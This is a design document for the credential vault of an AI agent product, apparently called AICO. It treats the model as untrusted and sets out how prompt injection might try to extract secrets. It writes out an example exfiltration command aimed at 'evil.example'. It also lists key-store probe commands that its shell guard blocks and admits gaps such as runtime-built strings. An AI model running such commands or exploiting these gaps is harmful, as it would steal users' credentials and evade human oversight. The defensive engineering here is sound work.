# Credential vault & broker

The agent can **use** secrets — passwords, SSH keys, API tokens, WinRM/SNMP/database
credentials, certificates — but can never **read** them. The model handles names
(`{{secret:nas-admin}}`); trusted engine code resolves the value at the moment of use,
under a policy, sometimes after a person says yes, and sends it only where the policy
allows. A value reaching a model context, the session log, a transcript, a spill file, a
hook, a stream event, an audit entry or a log is a defect.

Code: `src/vault/` (the vault), `src/tools/credentials.ts` (the model's three tools),
`src/vault/http.ts` (`/api/vault/*`), `src/vault/cli.ts` (`aico vault …`),
`src/vault/host-channel.ts` (AICO Desktop's private channel). Tests: `scripts/vault-test.mjs`
(part of `npm test`).

---

## 1. Threat model

**Untrusted:** the model, and everything it reads — web pages, files, tool output, MCP
results. Any of it may carry a prompt injection that tries to get a secret out. The model
has Bash, file tools, WebFetch and a browser. Assume it can `curl` the engine's loopback
API and may learn the API token.

**Trusted:** engine code, the AICO Desktop main process, and the person at the keyboard.

**Goals**

| | |
|---|---|
| G1 | Secret values never enter model context, the append-only session log, transcripts/exports, stream/UI events, spill files, hook input, sub-agent reports, compaction summaries, memory/knowledge, titles, traces or logs. |
| G2 | A secret is usable only within its declared scope: host/origin, tool, time, rate. |
| G3 | The owner can always see, manage, revoke and audit every credential. |
| G4 | Friendly: the person and the agent can both put credentials in; the agent can create credentials nobody ever has to see. |

**Non-goals, stated plainly**

- **A same-user process with a shell can attack the key store.** DPAPI, the macOS
  keychain and the Secret Service hand the master key to any process running as you. The
  agent's Bash is such a process. The shell guard refuses the obvious attempts; it is
  defence in depth, not a jail — the same honesty as AICO's sandbox (`AICO.md`, "Honest
  sandbox scope"). The strongest configuration is AICO Desktop (the key lives in the main
  process, never in the engine's environment or on disk unsealed) or a passphrase vault.
- **Shell substitution is opt-in per credential, and every use is shown to a person**,
  because `curl https://evil.example -d {{secret:x}}` is a shell command like any other.
  A person can still approve an obfuscated exfiltration they did not read carefully.
- **Redaction catches known values in common encodings**, not arbitrary transformations
  (reversal, compression, encryption, one character per line). The model is never given a
  value to transform; redaction catches accidents and obvious attempts.

---

## 2. Architecture

```
            model  ──names only──►  CredentialList / CredentialRequest / CredentialGenerate
              │                         (metadata, "stored as X", references — never values)
              │ writes {{secret:x}}
              ▼
  tool pipeline ── guard `vault` (file tools off the vault dir; shell key-store probes)
              └─── around `vault:placeholders` (Bash) ──► broker.resolve(ref, use)
                                                            │  policy: scope, tool, expiry, rate
                                                            │  approval: ApprovalPrompter (a person)
                                                            │  audit entry
                                                            ▼
                                                  value → child env AICO_SECRET_n (one process)
  trusted consumer tools (SSH/HTTP/WinRM/SNMP…) ──► broker.resolve(...) → send → release()
  desktop browser  ──parentPort vault/fill-request──► broker.resolve(Browser, origin) → autofill

  every sink ◄── redactor (all values the vault has held, every encoding) ── sink.ts
```

- **`store.ts`** holds records. `list()`/`get()` return metadata and policy. The only
  accessor for values (`secretOf`) is used by the broker's `resolve()` and `reveal()` and
  by the owner's CLI; a test fails if anything outside `src/vault` calls it.
- **`service.ts`** is the broker: resolve, generate, request-from-human, quarantine,
  owner operations with grant checks, and it keeps the sinks' redactor current.
- **`sink.ts`** is the one redactor every sink consults, dependency-free so the lowest
  layers can import it.

---

## 3. Data model

Two files under `<AICO_HOME>/vault/` (plus `audit.jsonl`):

- `key.json` — how the master key is sealed: provider, key-check value, and the sealed
  blob / keyring coordinates / scrypt parameters and wrapped key. **Never the key.**
- `vault.json` — `{format:"aico-vault", version:1, kcv, records:[{id, v, iv, tag, ct}], mac}`.

Each record's plaintext is `{meta, policy, secret}`, sealed with AES-256-GCM, a fresh
random IV per write, AAD = `aico-vault:v1:<id>:<version>`. Metadata and policy are sealed
too: a process that can edit the file cannot loosen a policy without the key. The file
MAC (HMAC over ids, versions, tags) detects deleted or reordered records. Writes are
atomic (temp file, fsync, rename) under a cross-process lock file with stale-lock
recovery. A file from a newer format is refused; migrations back the original up first.

**Kinds and secret fields** (the first is what a bare `{{secret:name}}` resolves to):

| kind | secret fields |
|---|---|
| login | password, totpSeed |
| ssh-key | privateKey, passphrase |
| ssh-password, basic-auth, winrm | password |
| api-token | token |
| snmp | community, authKey, privKey |
| database | password, connectionString |
| certificate | privateKey, passphrase, pfx |
| note | text |
| generic | value (or any field name) |

Metadata: `name` (unique, `[A-Za-z0-9][A-Za-z0-9_-]{0,63}`), `kind`, `username`, `host`,
`port`, `url`, `description`, `tags`, `createdBy` (`user` | `agent:<sessionId>`), public
parts (SSH public key, fingerprint, certificate), `quarantined`. A secret value that also
appears in the metadata is refused at create — the easiest accidental leak.

---

## 4. Scope and approval

`Policy = {allowedHosts, allowedOrigins, allowedTools, approval, allowShell, shellApproval?,
allowInsecureHttp?, allowSelfSigned?, expiresAt?, rateLimit?}`.

**Scope.** Empty host/origin lists fall back to the credential's own `host`/`url`.
Patterns: exact host; `*.example.com` (subdomains only, never the apex or a look-alike
suffix); CIDR `10.0.0.0/24`; `host:port`. Origins compare scheme and port exactly
(default ports applied), with an optional `*.` host. Userinfo in an origin is refused.

**Self-hosted servers.** Plain http is never inferred: it is allowed for an **explicit
`http://` origin on a private/LAN address**, or for a credential bound by host to a
private address, or anywhere with `allowInsecureHttp`. A self-signed certificate is
accepted by consumers only where `allowSelfSigned` is set (it rides on the resolved
credential as `allowSelfSigned`).

**Approval.** `auto` (no prompt within scope), `session` (asked once per session per
tool), `every-use`. Overrides, in the safe direction:

- A **shell** use is `every-use` unless a human set `shellApproval: 'auto'` — an agent can
  never make its own shell use unattended.
- An **unscoped** credential, or a use that declares no target, is `every-use` unless the
  owner chose `auto`.

Defaults: user-entered credentials `session`; agent-generated credentials bound to a
host/url `auto` (trusted tools may use them there without asking), unbound ones
`every-use`; quarantined ones `session` if the paste named a host, else `every-use`.

**Loosening** (anything that widens use: a new host/origin/tool, dropping a list, higher
approval, turning on shell/http/self-signed/auto-shell, a later or removed expiry, a higher
rate) needs a one-time human grant. Tightening never does. Changing `host`/`url`/`port` of
a credential with no explicit lists is a loosening. Replacing or deleting a credential the
*user* stored needs a grant too (rotating someone's token is a way to hijack it).

Session grants, rate windows and grants live in memory; a restart forgets them, which is
the safe direction to forget in.

---

## 5. Human grants: what the token cannot do

The API token authenticates a client, not a person, and the model may have it. So a
person's "yes" reaches the engine only through:

1. **The host channel (AICO Desktop).** Main shows a native confirmation, mints a nonce,
   and passes `{type:'vault/grant', nonce, action, credentialId}` to the engine over the
   utility process's `parentPort`. The Credential Manager then calls the HTTP route with
   `grant: nonce`. No shell command can write to `parentPort`.
2. **A passphrase the person types** — the vault passphrase (passphrase vaults) or a
   standalone grant passphrase (`aico vault grant-passphrase`, keyring vaults). `POST
   /api/vault/grant {passphrase, action, id}` returns a one-time grant; five wrong tries
   start an exponential lockout.
3. **The terminal** of an interactive CLI (see §9).

Grants are one-time, action-specific, optionally credential-specific, and expire (2
minutes by default, 10 at most). A person's **no** needs no proof: any client may decline
a pending approval or request.

---

## 6. Key management

| Provider | Where the key lives | Unlock |
|---|---|---|
| `injected` | AICO Desktop main (Electron `safeStorage`), handed over `parentPort` as `vault/key` | automatic when main sends it |
| `dpapi` | `key.json` blob sealed by Windows DPAPI (CurrentUser) via a PowerShell child; key over stdin/stdout, never argv | automatic |
| `macos-keychain` | a generic-password item (`security -i`, value on stdin) | automatic |
| `secret-tool` | Secret Service item (`secret-tool store`, value on stdin) | automatic |
| `passphrase` | wrapped with an scrypt (N=2^15, r=8, p=1) key | `aico vault unlock --server …` / `POST /api/vault/unlock`; auto-locks after 15 min idle |

The master key is **never** put in an environment variable: every child inherits the
environment, and the agent's Bash is a child. If no provider can seal, the vault refuses
to store anything and says why — there is no plaintext fallback. A new vault's provider is
chosen by `AICO_VAULT_KEY_PROVIDER` (naming a provider is not secret) or the platform
default. An existing vault always reopens with the provider named in its `key.json`.

---

## 7. Sinks

Every place text leaves the engine or is written down, and how the redactor reaches it.
"Redactor" means `sink.ts`: every value the vault has held in this process, in every
indexed encoding, replaced by `[secret:<name>]`.

| Sink | Where | How |
|---|---|---|
| Tool result → model | `tools/pipeline.ts` `execute()` | redacted **before** any post-execute stage, and again after (post stages may replace it). Denials and stage failures too. |
| PostToolUse hook | same | runs as a post stage, so it sees only the redacted result |
| All hooks (Pre/PostToolUse, UserPromptSubmit, Stop, …) | `hooks.ts` `runHooks()` | `ctx` redacted before it becomes env vars |
| Task / Investigate / MCP results and errors | `tools/spill.ts` `spillResult()`, `agent.ts` loop dispatch | redacted in spill, and again where the loop hands results to the model |
| Spill files | `tools/spill.ts` | redacted before the excerpt is cut and before `saveSpill` writes |
| Session log (append-only), its `.jsonl`, replay, every request derived from it, compaction summaries, titles | `session/session.ts` `append()` | every event's data redacted on the way in |
| Transcript export | `session/export.ts` | redacted (covers logs written before a value was vaulted) |
| Compaction's dropped-turns report | `session/compact.ts` | redacted before write |
| SSE stream (chunks, tool-start/done, progress, titles, notices) | `server/events.ts` `publish()` / `publishTopic()` | every frame |
| JSON API responses | `server/index.ts` `send()` | every body (the vault routes have their own sender; only `reveal` returns a value) |
| Run callbacks — onToolCall/onToolDone/onChunk/onReasoning/onNotice/onAskUser — for the terminal UI, the server, background and sub-agent registries | `vault/agent-hooks.ts` `guardAgentRun()`, applied in `runAgent()` | wrapped; streamed text uses the accumulated redactor, which also holds back a prefix of a value still arriving |
| runAgent's return (sub-agent reports, background results and notifications, cron) | `agent.ts` `runAgent()` | redacted |
| Bash live output (`tool-progress`) | `tools/bash.ts` progress sink | accumulated redaction |
| Terminal tool output | pipeline | as any tool result |
| Work ledger (`work.jsonl`) | `work/store.ts` | redacted |
| Legacy CLI history | `history.ts` | redacted |
| Audit log | `vault/audit.ts` | built from fixed fields, never a record or body; free text redacted and bounded |
| **User messages** | `server/runs.ts` `submit()`, the steer/followup route, `runAgent()` (depth 0) | **scanned**: detected secrets are vaulted (quarantined) and replaced by `[secret:name]` before the title, stream, hooks, log or model see them; a value that cannot be vaulted is removed from the text instead |
| Memory, knowledge, canvas, files the agent writes | — | not separately filtered: they are written from model output and tool arguments, which only ever contain what the model was given (already redacted) and what the user typed (scanned) |

Everything in this table is exercised by the canary test (`scripts/vault-test.mjs`, V12–V15):
a canary is pushed through a real turn — Bash output of a file holding it in several
encodings, big enough to spill; a `{{secret:…}}` in Bash; the model "saying" it; a token
typed in the user message — and the result, every request the model was sent, the session
log file, the export, the spill file, hook input, stream callbacks, API responses and the
audit log are decoded (base64 at every offset, hex, URL-encoding) and searched. Zero hits.

---

## 8. The model's tools

- **CredentialList** `{host?, kind?}` — metadata: name, reference, kind, fields (names),
  username, host/url, what it is usable with, shell yes/no, approval, public key.
- **CredentialRequest** `{name, kind, host?, url?, username?, fields?, reason}` — asks a
  person. The value goes from their keyboard into the vault; the tool returns `stored as
  NAME` / `declined` / `timed out` / `unavailable`. Removed from headless runs.
- **CredentialGenerate** `{name, kind, username?, host?, url?, port?, length?, symbols?,
  allowShell?, allowSelfSigned?}` — a strong random password/token or an ed25519 key pair
  (OpenSSH format), bound to the scope. Returns the reference and non-secret parts
  (username, SSH public key, fingerprint).

**No tool returns secret material.** The invariant is tested three ways: the credential
tools are called with the redactor switched *off* and their raw output searched; every
registered tool name is driven through the pipeline and through the real agent loop with a
fake body that returns the canary in several encodings; and a source scan fails if any
tool module other than `tools/credentials.ts` imports the vault, or anything outside
`src/vault` calls a value accessor. A future consumer tool registers with
`registerVaultConsumerTool(name)` (`tools/credentials.ts`) and is reviewed against §10.
The built-in consumers are the ops tools in `tools/ops/` (SSH, HTTP APIs, WinRM, SNMP —
[ops-tools.md](ops-tools.md)); `scripts/ops-test.mjs` extends the source scan to every
module under `src/tools/` (only `credentials.ts` and `ops/` may import the vault) and runs
each ops tool with the redactor off.

---

## 9. Owner surfaces

### HTTP (`/api/vault/*`, behind the server token)

| Route | Returns a value? | Needs |
|---|---|---|
| `GET status` (incl. pending approvals/requests), `list?host&kind`, `get?id`, `audit?limit&id`, `match?origin` | no | token |
| `POST create {name, kind, secret, …, policy?}` | no (write-only) | token |
| `POST generate {name, kind, host?, url?, …}` | no | token |
| `POST update {id, name?, username?, host?, url?, port?, description?, tags?, grant?}` | no | grant if it changes scope |
| `POST policy {id, policy, grant?}` | no | grant if loosening |
| `POST rotate {id, secret, grant?}` / `POST delete {id, grant?}` | no | grant for a user's credential |
| `POST reveal {id, grant}` | **yes** | grant, always |
| `POST grant {passphrase, action, id?}` | a one-time grant | the passphrase |
| `POST approve {id, approve, grant?/passphrase?}` | no | proof to approve; nothing to decline |
| `POST fulfil {requestId, value|secret|decline, username?}` | no (status only) | token |
| `POST lock`, `POST unlock {passphrase}` | no | token / passphrase |

Responses are `Cache-Control: no-store`; errors never echo input; request bodies are
never logged.

**Stream events** (on the session's SSE stream; session-less ones on topic `vault`):
`vault-approval` (an `ApprovalRequest` plus `needs: 'desktop' | 'passphrase'`),
`vault-request` (a `HumanCredentialRequest`: requestId, name, kind, fields, host/url,
username, reason), `vault-quarantined` (`{items:[{name, kind, label}], dropped}`),
`vault-changed`. The client shows `vault-request` as a secure prompt and posts the value
to `fulfil`; it shows `vault-approval` with the description (which includes the exact
shell command) and posts `approve`.

### Host channel (AICO Desktop, `parentPort`)

Engine side: `src/vault/host-channel.ts`, attached in `desktop/engine/entry.ts`. Main must
start the engine with `AICO_VAULT_KEY_PROVIDER=injected` to use its own key.

| Direction | Message | Main's job |
|---|---|---|
| ← | `{type:'vault/key', key: base64(32 bytes)}` | send once the engine is ready; key sealed with `safeStorage` in main |
| → | `{type:'vault/ready', status}` | |
| ← | `{type:'vault/grant', nonce, action, credentialId?, ttlMs?}` | only after a **native** confirmation; nonce ≥ 16 chars, random |
| → | `{type:'vault/approve-request', request}` | native dialog showing `request.description`; answer below |
| ← | `{type:'vault/approval', id, approved, scope?}` | `scope:'once'` = Allow once (a session-mode yes not remembered) |
| → | `{type:'vault/credential-request', request}` | secure prompt in main (not the renderer's DOM if avoidable) |
| ← | `{type:'vault/fulfil', requestId, secret?|decline, username?}` | |
| ← | `{type:'vault/fill-request', requestId, origin, name?, sessionId?, tool?}` | browser vault login for the page's **top-level** origin; `tool` is `Browser` (a person's fill) or `browser_login` (the agent's) |
| → | `{type:'vault/fill', requestId, ok, name?, username?, fields?, allowSelfSigned?, reason?}` | fill, then drop the value |
| ← | `{type:'vault/lock'}` | |
| → | `{type:'vault/changed'}` | refresh the Credential Manager |
| ← | `{type:'permission/decide', sessionId, id, allow}` | a person's tool-permission answer (desktop/engine/entry.ts; HTTP yeses are refused while attached) |

Main's side is `desktop/electron/vault-host.ts` (key, grants, approvals, fills),
`secure-prompt.ts` (the typing window), `credential-manager.ts` (the manager's
IPC; the `aico://` proxy refuses `vault/reveal|grant|export` from the renderer)
and `browser-vault.ts` / `browser-login.ts` (the browser's logins and `browser_login`).
Stream events also carry `vault-request-done` / `vault-approval-done` so every client
closes a prompt answered elsewhere, and `hostPrompt: true` on a request the desktop is
already showing. `POST export {passphrase, grant}` / `POST import {file, passphrase}`
back the manager's encrypted Export/Import (grant `export`; import only adds).

### CLI

`aico vault init [--passphrase] | list | add <name> -k <kind> [--host --url --username
--generate --allow-shell] | remove <name> | show <name> | export <file> | import <file>
[--replace] | grant-passphrase | lock|unlock [--server <url>] | audit [-n] [--name]`.

Secrets are read from a hidden prompt, or stdin when piped (never argv). `show`, `export`
and `remove` need an interactive terminal on both ends, a typed confirmation, and refuse
to run under `AICO_AGENT_SHELL=1` (set in every shell AICO spawns); the shell guard also
refuses `aico vault show|export`. Each of those is a hurdle a determined process can clear
(a pty, unsetting a variable). The real barrier is a passphrase: with a passphrase vault,
or a grant passphrase set, `show`/`export` also ask for it. Exports are encrypted with a
passphrase you choose (scrypt + AES-256-GCM).

---

## 10. How to write a secret-consuming tool

```ts
import { resolve, VaultError } from '../vault/index.js';
// Register the tool as a consumer: add `SSH: 'consumer'` to VAULT_TOOL_CLASSES in
// tools/credentials.ts (or call registerVaultConsumerTool('SSH') for a plugin tool).

export async function sshRun(input: { host: string; credential: string; command: string }, sessionId?: string) {
  let secret;
  try {
    secret = await resolve(input.credential, {        // "nas-admin", "nas-admin.password" or "{{secret:nas-admin}}"
      tool: 'SSH',                                    // your tool's name: policies can allow/deny it
      host: input.host,                               // where the value is going — you connect HERE and nowhere else
      purpose: `run \`${input.command}\` on ${input.host}`, // shown to the person, written to the audit log
      ...(sessionId ? { sessionId } : {}),
    });
  } catch (err) {
    // Not found (lists similar names), out of scope, declined, locked: all safe to return.
    return { error: err instanceof VaultError ? err.message : 'credential unavailable' };
  }
  try {
    const out = await connectAndRun(input.host, secret.username, secret.value(), input.command);
    return { stdout: out.stdout, exit: out.code };   // never the credential; output is redacted anyway
  } finally {
    secret.release();
  }
}
```

Rules:

1. **Declare the real target.** The host/origin in `use` must be the one you connect to.
   Resolving for `10.0.0.5` and connecting to `input.otherHost` defeats the scope check —
   that is a bug in your tool, not in the policy.
2. **Take the name, not the value.** Accept `{{secret:…}}` or a bare name in your input
   schema; never accept a raw password argument from the model.
3. **Never put a value in** your result, error, log line, argv of a child process (use its
   stdin or an env var for that one child), a temp file (unless mode 0600 and deleted in
   `finally`), or a URL query string.
4. **Call `release()`** as soon as the value is sent. (JS strings cannot be zeroed; this
   shortens reachability, it does not erase.)
5. **Honour `allowSelfSigned`** only for the credential's own origins.
6. Add the tool to `VAULT_TOOL_CLASSES` as `consumer`, and a test that its result for a
   canary credential contains no canary with the redactor switched off.

Other consumer API (`src/vault/index.ts`): `list(filter)`, `findForOrigin(origin)`,
`create(input)`, `generate(input, createdBy)`, `requestFromHuman(req)`,
`setApprovalPrompter(p)` (`ttyPrompter`, `callbackPrompter`, `denyPrompter`),
`setHumanRequester(r)`, `redactor()`, `redact.{value,text,accumulated,stream}`.

---

## 11. The scenario, walked through

> "Install Grafana on 10.0.0.5 and set it up." … later … "Show me the portal in the browser."

1. The agent SSHes in with a credential the user stored earlier (`nas-root`, bound to
   `10.0.0.5`, `session` approval): the SSH tool resolves it, the person approves once for
   the session, the value goes to 10.0.0.5 only.
2. It needs an admin account for Grafana. `CredentialGenerate {name:"grafana-admin",
   kind:"login", username:"admin", url:"https://10.0.0.5:3000", allowSelfSigned:true}`
   stores a 24-character password nobody has seen, bound to that origin, `auto` within
   scope. The model gets `{{secret:grafana-admin}}` and `username: admin`.
3. To set the password it uses a trusted HTTP/SSH tool with the reference (no prompt:
   agent-generated, in scope). If it has only Bash, the credential must allow shell use,
   and the person sees `grafana-cli admin reset-admin-password {{secret:grafana-admin}}`
   and approves it; the value reaches that one child as `$AICO_SECRET_1`.
4. Everything the commands print passes the redactor: a `grafana.ini` it `cat`s shows
   `admin_password = [secret:grafana-admin]`.
5. "Show me the portal": the desktop browser opens `https://10.0.0.5:3000`, main sends
   `vault/fill-request` for that top-level origin, the engine resolves `grafana-admin` for
   `Browser` at that origin (in scope, `auto`), replies over `parentPort`, and main fills
   the form — the model asked for a page and never saw the exchange. The self-signed
   certificate is accepted because the credential says so for that origin.
6. A CAPTCHA, a one-time code, or a site with no matching credential is handed to the
   person. For the last, `CredentialRequest` asks them to type it once into a secure
   prompt; it is saved bound to that origin for next time.
7. The person opens the Credential Manager: sees `grafana-admin` (created by the agent,
   bound to `https://10.0.0.5:3000`), its audit trail, and can reveal it (native
   confirmation → grant) or revoke it.

---

## 12. Honest limits

- **Same-user key-store access** (§1). The shell guard blocks `security find-generic-password`,
  `secret-tool lookup`, `ProtectedData.Unprotect`, `cmdkey /list`, `/proc/*/environ`,
  debugger attach and reads of the vault directory — by pattern. A command that builds
  those strings at runtime is not seen.
- **Approved shell commands can exfiltrate.** The approval shows the command; the person
  must read it.
- **Redaction coverage**: known values only; standard/url-safe base64 (all alignments),
  hex, URL-encoding, JSON escaping, shell quoting, per-line for multi-line values. Not
  line-wrapped base64, compression, encryption, or transformations. Values under 4
  characters are not redacted; 4–7 characters only where they stand alone.
- **Redaction index lifetime.** Every value the process has held stays in the in-memory
  index until exit, including after a lock or delete (a deleted secret may still be in a
  config file). With a passphrase vault that has not been unlocked since start, the index
  is empty — values stored earlier are not redacted from, say, a file the agent reads
  before unlock. Prefer a keyring or Desktop vault if that matters.
- **Whole-file rollback** to an older genuine `vault.json` is not detected.
- **Web approvals need a passphrase.** Without AICO Desktop or a grant passphrase, a use
  that needs approval in `aico serve` is refused rather than left for the token to approve.
- **Settings are not trusted.** `vault.scanUserMessages: false` in a settings file the
  agent can write turns scanning off; nothing in settings can loosen a policy or reveal.
- **The scanner is high-confidence, not complete**: a bare password with no context
  ("it's hunter2") is not caught. Images and attachments are not scanned.
- **Lock and release are hygiene**: V8 strings cannot be zeroed.
- **Tool-permission yeses** (`/api/permission`, `src/server/decision-gate.ts`): desktop only
  over the host channel; `aico serve`/VS Code need the UI key from the printed link's `#ui=`
  fragment (traded for a per-client nonce tied to an open event stream). The key travels
  with the token in that one link, so a process that can read the person's terminal
  scrollback or browser history has both; the token alone is no longer enough.
- **"Allow for this session" from the browser tools** is remembered until AICO restarts:
  the desktop's MCP tools do not know which chat called them (the dialog says so).
